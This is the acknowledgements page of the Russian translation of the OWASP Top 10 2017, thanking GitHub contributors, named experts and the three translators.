<p>Впервые все данные, предоставленные для выпуска Топ-10, а также полный список источников <a href="https://github.com/OWASP/Top10/tree/master/2017/datacall/submissions">доступны публично</a>.</p>
<h2 id="отдельные-участники-проекта">Отдельные участники проекта</h2>
<p>Хотим поблагодарить отдельных участников проекта, которые внесли ощутимый вклад в работу по созданию Топ-10 на GitHub:</p>
<ul>
<li>ak47gen</li>
<li>alonergan</li>
<li>ameft</li>
<li>anantshri</li>
<li>bandrzej</li>
<li>bchurchill</li>
<li>binarious</li>
<li>bkimminich</li>
<li>Boberski</li>
<li>borischen</li>
<li>Calico90</li>
<li>chrish</li>
<li>clerkendweller</li>
<li>D00gs</li>
<li>davewichers</li>
<li>drkknight</li>
<li>drwetter</li>
<li>dune73</li>
<li>ecbftw</li>
<li>einsweniger</li>
<li>ekobrin</li>
<li>eoftedal</li>
<li>frohoff</li>
<li>fzipi</li>
<li>gebl</li>
<li>Gilc83</li>
<li>gilzow</li>
<li>global4g</li>
<li>grnd</li>
<li>h3xstream</li>
<li>hiralph</li>
<li>HoLyVieR</li>
<li>ilatypov</li>
<li>irbishop</li>
<li>itscooper</li>
<li>ivanr</li>
<li>jeremylong</li>
<li>jhaddix</li>
<li>jmanico</li>
<li>joaomatosf</li>
<li>jrmithdobbs</li>
<li>jsteven</li>
<li>jvehent</li>
<li>katyanton</li>
<li>kerberosmansour</li>
<li>koto</li>
<li>m8urnett</li>
<li>mwcoates</li>
<li>neo00</li>
<li>nickthetait</li>
<li>ninedter</li>
<li>ossie-git</li>
<li>PauloASilva</li>
<li>PeterMosmans</li>
<li>pontocom</li>
<li>psiinon</li>
<li>pwntester</li>
<li>raesene</li>
<li>riramar</li>
<li>ruroot</li>
<li>securestep9</li>
<li>securitybits</li>
<li>SPoint42</li>
<li>sreenathsasikumar</li>
<li>starbuck3000</li>
<li>stefanb</li>
<li>sumitagarwalusa</li>
<li>taprootsec</li>
<li>tghosth</li>
<li>TheJambo</li>
<li>thesp0nge</li>
<li>toddgrotenhuis</li>
<li>troymarshall</li>
<li>tsohlacol</li>
<li>vdbaan</li>
<li>yohgaki</li>
</ul>
<p>Также хотим поблагодарить всех, кто присылал свои отзывы через Твиттер, по электронной почте или каким-либо другим способом.</p>
<p>И конечно, мы хотим отметить Дирка Веттера (Dirk Wetter), Джима Манико (Jim Manico) и Осаму Эльнаггара (Osama Elnaggar) за их огромный вклад. Также, неоценимую помощь в создании новой категории <strong>A8:2017-Небезопасная десериализация</strong> оказали Крис Фрохофф (Chris Frohoff) и Габриэль Лоуренс (Gabriel Lawrence).</p>
<h1 id="russian-translation-for-top10---2017">Russian Translation for Top10 - 2017</h1>
<h2 id="acknowledgements">Acknowledgements</h2>
<ul>
<li>Oleksii Skachkov (a.k.a <a href="https://github.com/hamster4n">hamster4n</a>)</li>
<li>Taras Ivashchenko (a.k.a. <a href="https://github.com/oxdef">oxdef</a>)</li>
<li>Ivan Kochurkin (a.k.a <a href="https://github.com/KvanTTT">KvanTTT</a>)</li>
</ul>
</body>
</html>
